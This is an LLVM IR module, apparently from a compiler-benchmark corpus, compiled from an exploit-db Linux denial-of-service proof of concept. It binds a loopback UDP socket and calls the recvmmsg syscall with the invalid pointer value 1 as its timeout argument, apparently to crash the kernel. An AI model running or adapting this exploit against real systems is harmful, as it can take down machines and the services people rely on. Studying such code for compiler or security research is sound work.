; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_31305.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_31305.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.mmsghdr = type { i64, %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32, %struct.iovec* }
%struct.iovec = type { i8*, i32 }
%struct.timespec = type { i64, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@INADDR_LOOPBACK = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"bind()\00", align 1
@__NR_recvmmsg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"recvmmsg()\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"%d messages received\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"%d %s\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@BUFSIZE = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@VLEN = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [10 x %struct.mmsghdr], align 16
  %7 = alloca [10 x %struct.iovec], align 16
  %8 = alloca [10 x [201 x i8]], align 16
  %9 = alloca %struct.timespec, align 8
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* @AF_INET, align 4
  %11 = load i32, i32* @SOCK_DGRAM, align 4
  %12 = call i32 @socket(i32 %10, i32 %11, i32 0)
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %19

15:                                               ; preds = %0
  %16 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* @EXIT_FAILURE, align 4
  %18 = call i32 @exit(i32 %17) #3
  unreachable

19:                                               ; preds = %0
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  store i32 %20, i32* %21, align 4
  %22 = load i32, i32* @INADDR_LOOPBACK, align 4
  %23 = call i32 @htonl(i32 %22)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 4
  %26 = call i32 @htons(i32 1234)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 0
  store i32 %26, i32* %27, align 4
  %28 = load i32, i32* %2, align 4
  %29 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %30 = call i32 @bind(i32 %28, %struct.sockaddr* %29, i32 12)
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %32, label %36

32:                                               ; preds = %19
  %33 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %34 = load i32, i32* @EXIT_FAILURE, align 4
  %35 = call i32 @exit(i32 %34) #3
  unreachable

36:                                               ; preds = %19
  %37 = getelementptr inbounds [10 x %struct.mmsghdr], [10 x %struct.mmsghdr]* %6, i64 0, i64 0
  %38 = call i32 @memset(%struct.mmsghdr* %37, i32 0, i32 240)
  store i32 0, i32* %4, align 4
  br label %39

39:                                               ; preds = %68, %36
  %40 = load i32, i32* %4, align 4
  %41 = icmp slt i32 %40, 10
  br i1 %41, label %42, label %71

42:                                               ; preds = %39
  %43 = load i32, i32* %4, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [10 x [201 x i8]], [10 x [201 x i8]]* %8, i64 0, i64 %44
  %46 = getelementptr inbounds [201 x i8], [201 x i8]* %45, i64 0, i64 0
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [10 x %struct.iovec], [10 x %struct.iovec]* %7, i64 0, i64 %48
  %50 = getelementptr inbounds %struct.iovec, %struct.iovec* %49, i32 0, i32 0
  store i8* %46, i8** %50, align 16
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [10 x %struct.iovec], [10 x %struct.iovec]* %7, i64 0, i64 %52
  %54 = getelementptr inbounds %struct.iovec, %struct.iovec* %53, i32 0, i32 1
  store i32 200, i32* %54, align 8
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [10 x %struct.iovec], [10 x %struct.iovec]* %7, i64 0, i64 %56
  %58 = load i32, i32* %4, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [10 x %struct.mmsghdr], [10 x %struct.mmsghdr]* %6, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.mmsghdr, %struct.mmsghdr* %60, i32 0, i32 1
  %62 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %61, i32 0, i32 1
  store %struct.iovec* %57, %struct.iovec** %62, align 8
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [10 x %struct.mmsghdr], [10 x %struct.mmsghdr]* %6, i64 0, i64 %64
  %66 = getelementptr inbounds %struct.mmsghdr, %struct.mmsghdr* %65, i32 0, i32 1
  %67 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %66, i32 0, i32 0
  store i32 1, i32* %67, align 8
  br label %68

68:                                               ; preds = %42
  %69 = load i32, i32* %4, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %4, align 4
  br label %39

71:                                               ; preds = %39
  %72 = getelementptr inbounds %struct.timespec, %struct.timespec* %9, i32 0, i32 1
  store i32 1, i32* %72, align 8
  %73 = getelementptr inbounds %struct.timespec, %struct.timespec* %9, i32 0, i32 0
  store i64 0, i64* %73, align 8
  %74 = load i32, i32* @__NR_recvmmsg, align 4
  %75 = load i32, i32* %2, align 4
  %76 = getelementptr inbounds [10 x %struct.mmsghdr], [10 x %struct.mmsghdr]* %6, i64 0, i64 0
  %77 = call i32 @syscall(i32 %74, i32 %75, %struct.mmsghdr* %76, i32 10, i32 0, i8* inttoptr (i64 1 to i8*))
  store i32 %77, i32* %3, align 4
  %78 = load i32, i32* %3, align 4
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %84

80:                                               ; preds = %71
  %81 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %82 = load i32, i32* @EXIT_FAILURE, align 4
  %83 = call i32 @exit(i32 %82) #3
  unreachable

84:                                               ; preds = %71
  %85 = load i32, i32* %3, align 4
  %86 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i32 %85)
  store i32 0, i32* %4, align 4
  br label %87

87:                                               ; preds = %108, %84
  %88 = load i32, i32* %4, align 4
  %89 = load i32, i32* %3, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %111

91:                                               ; preds = %87
  %92 = load i32, i32* %4, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [10 x [201 x i8]], [10 x [201 x i8]]* %8, i64 0, i64 %93
  %95 = load i32, i32* %4, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [10 x %struct.mmsghdr], [10 x %struct.mmsghdr]* %6, i64 0, i64 %96
  %98 = getelementptr inbounds %struct.mmsghdr, %struct.mmsghdr* %97, i32 0, i32 0
  %99 = load i64, i64* %98, align 8
  %100 = getelementptr inbounds [201 x i8], [201 x i8]* %94, i64 0, i64 %99
  store i8 0, i8* %100, align 1
  %101 = load i32, i32* %4, align 4
  %102 = add nsw i32 %101, 1
  %103 = load i32, i32* %4, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [10 x [201 x i8]], [10 x [201 x i8]]* %8, i64 0, i64 %104
  %106 = getelementptr inbounds [201 x i8], [201 x i8]* %105, i64 0, i64 0
  %107 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i32 %102, i8* %106)
  br label %108

108:                                              ; preds = %91
  %109 = load i32, i32* %4, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %4, align 4
  br label %87

111:                                              ; preds = %87
  %112 = load i32, i32* @EXIT_SUCCESS, align 4
  %113 = call i32 @exit(i32 %112) #3
  unreachable
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(%struct.mmsghdr*, i32, i32) #1

declare dso_local i32 @syscall(i32, i32, %struct.mmsghdr*, i32, i32, i8*) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
